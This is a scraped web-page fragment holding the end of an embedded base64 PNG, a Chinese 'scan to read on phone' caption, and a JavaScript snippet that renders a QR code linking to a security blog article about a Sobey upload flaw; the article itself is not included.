ty1+/wPBQcXfodMANRde/VERn1/ouPzWHDtCeN0TWP/VyeOCj9mWf3RCoO84BDc7hGLQ6/zkKS7zWqh1a+JlELWAIgG2HzsL8XSklT3d8qm1rBDJgagBFBY4VbckHDh/tCEHe63wiRtYDTlxSZ+UdA3RuM5sdrhR3kgPMeZQ0bpco+Wg11sjhIjLt+V68iE0UFG8DYL3eg/b+hB5gEMvf5cHdr+15T26hpRqy7nkBkpDIDoI53B2Wqg1Zrr8ZIx0UOsALxLnZnLEOQ50T2gbA0wNEdhqACUObJz3FjoIEQNMDRHYagDrx97HzT7KhNzsXP/scf4HAAD//w4iJOoAAAAGSURBVAMAWSxws0xnDwIAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-watermark-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 